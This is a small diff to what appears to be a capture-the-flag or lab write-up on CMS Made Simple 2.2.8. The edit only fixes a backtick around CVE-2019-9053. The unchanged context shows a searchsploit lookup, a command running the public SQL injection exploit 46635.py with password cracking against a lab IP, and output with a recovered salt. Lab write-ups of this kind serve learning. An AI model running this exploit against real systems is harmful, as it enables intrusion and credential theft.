@@ -15,7 +15,7 @@
 ## CMS Made Simple 2.2.8
 - `searchsploit cms made simple 2.2`
   - `CMS Made Simple < 2.2.10 - SQL Injection              | php/webapps/46635.py`
-  - `CVE-2019-9053
+  - `CVE-2019-9053`
   - `python /usr/share/exploitdb/exploits/php/webapps/46635.py -u http://10.10.177.101/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`
 ```
 [+] Salt for password found: 1dac0d92e9fa6bb2
